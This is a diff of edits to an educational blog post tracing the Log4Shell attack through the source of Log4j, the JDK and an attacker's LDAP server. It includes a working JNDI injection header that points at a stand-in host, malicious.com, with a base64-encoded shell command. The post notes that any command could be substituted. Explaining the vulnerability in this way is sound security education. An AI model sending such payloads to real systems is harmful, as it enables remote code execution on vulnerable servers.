@@ -4,7 +4,7 @@ By now, we've seen a multitude of posts covering the Log4j exploit, the attacks 
 
 Most of these posts focus on applying the appropriate mitigations, explaining how the vulnerability works at a high level. I thought it would be fun to take a deeper dive and perhaps in the process, learn some intricacies about how Java works and spread awareness of security topics to a broader developer audience. I often think that as application developers, we don't spend enough time exploring other codebases, and what better code to explore than the code involved in the biggest security vulnerability of the decade? So, in the name of science and better application security, here we go.
 
-Before we dive into the source, let's begin with a high-level diagram that outlines the key steps involved in the attack:
+Let's begin with a high-level diagram that outlines the key steps involved in the attack:
 
 ![attack diagram](https://s3.us-west-1.amazonaws.com/beyang.org-public/images/log4j.svg)
 
@@ -13,13 +13,9 @@ Before we dive into the source, let's begin with a high-level diagram that outli
 1. Log4j will interpolate the value of `${jndi:ldap://malicious.com}` by using JNDI, a name lookup mechanism provided by the JDK, which in turn will attempt to resolve `ldap://malicious.com` by sending an LDAP request to the attacker's server.
 1. The attacker's server will send a response containing metadata that identifies a Java class and a URL pointing back to the attacker's server as the place from which to fetch the class.
 1. The vulnerable server fetches the class from the attacker's server.
-1. The attacker's server responds with a malicious class, which the vulnerable server then receives and runs.
+1. The attacker's server responds with a malicious class, which the vulnerable server then receives and instantiates in order to finish computing the interpolated value.
 
-Now for the deep dive into source code. We'll be walking through what happens at each step of the exploit in the following code:
-
-- An vulnerable web service that uses Log4j to log HTTP request metadata
-- A vulnerable version of Log4j (2.14)
-- A malicious server the attacker will direct the vulnerable service to make requests to
+Now for the deep dive into source code. We'll be walking through what happens at each step of the exploit across the code of the vulnerable service, Log4j, the JDK, and the attacker's server:
 
 ## Part 0: The vulnerable code
 
@@ -27,9 +23,7 @@ We start with a vulnerable application logging a HTTP request header value in a 
 
 https://sourcegraph.com/github.com/christophetd/log4shell-vulnerable-app/-/blob/src/main/java/fr/christophetd/log4shell/vulnerableapp/MainController.java?L17-20
 
-If we were embedding this value in a SQL query or a web page, there would clearly be potential for a SQL injection or reflected XSS attack, but we're just logging it, so what's the worst that could happen?
-
-Well, it turns out that sometimes logging isn't as simple as it seems. Let's dive into what happens when the attacker sends a malicious payload to this HTTP handler.
+If we were embedding this value unsanitized in a SQL query or a website, there would clearly be potential for a SQL injection or reflected XSS attack, but we're just logging it, so what's the worst that could happen? Well, let's take a look at what happens when an attacker sends a malicious payload as the header value.
 
 ## Part 1: Log4j
 
@@ -39,17 +33,17 @@ Say an attacker issues a HTTP request with the following request header to our v
 X-Api-Version: ${jndi:ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}
 ```
 
-There are different components to this payload that will come into play in different parts of the exploit. The last component of the URL path, `dG91Y2ggL3RtcC9wd25lZAo=`, is the base64 encoding of "touch /tmp/pwned", the shell command we will eventually have execute on our vulnerable server. The first part that comes into play is the string interpolation syntax and JNDI prefix `${jndi:...}`.
+There are different components to this payload that will come into play in different parts of the exploit:
 
-<!--
-Here, malicious.com is running a malicious service with LDAP and HTTP endpoints that we'll explore later. The value `dG91Y2ggL3RtcC9wd25lZAo=` is the base64 encoding of the malicious command we want the vulnerable server to run, in this case, `touch /tmp/pwned`, to demonstrate arbitrary filesystem access.
--->
+* The first part is the string interpolation syntax and JNDI prefix `${jndi:ldap://...}` which will instruct Log4j to interpolate the value for the name that follows using the LDAP substitution mechanism in JNDI.
+* Next comes the host and port `malicious.com:1389`, which will direct the LDAP request to the attacker's server.
+* The URL path instructs the attacker's server as to what kind of response to construct. The last component of this path, `dG91Y2ggL3RtcC9wd25lZAo=`, is the base64 encoding of the shell command, "touch /tmp/pwned", which we desire to execute on the vulnerable server. (This command is obviously innocuous, but the attacker could make the vulnerable server execute any arbitrary command by base64-encoding it and including that as part of the header value.)
 
-Inside Log4j, there is a method for substituting values for format strings. It looks for the string interpolation syntax, `${}`, and then selects a string substitutor to compute the value to substitute:
+Inside Log4j, there is a method for substituting values in format strings. It looks for the string interpolation syntax, `${}`:
 
 https://sourcegraph.com/github.com/apache/logging-log4j2@rel/2.14.1/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.java?L128-134
 
-Further down the call stack, we get into the interpolation logic, which selects a lookup method based on the prefix of the name:
+Further down the call stack, we get into the interpolation logic, which selects a lookup method based on the prefix of the name (`String var`, which contains the value `jndi:ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=`):
 
 https://sourcegraph.com/github.com/apache/logging-log4j2@4b789c8/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java?L198-239
 
@@ -185,7 +179,7 @@ The path to bridging all these gaps lies through source code, and tools that fac
 
 We hope interactive documentation like this can link high-level understanding to specific versioned blocks of source code, and thereby be a force multiplier for disseminating a shared understanding of code and security--across individuals, teams, and organizational boundaries. If you found this post useful, consider forking it, creating a walkthrough of your own for a library you rely on, and sharing it with others! As another example, you can look at the [Interactive introduction to OpenVSCode Server](https://sourcegraph.com/github.com/gitpod-io/openvscode-server@docs/-/blob/sourcedive.snb.md).
 
-## References
+## Acknowledgements
 
 The following were extremely helpful resources when writing this post:
 
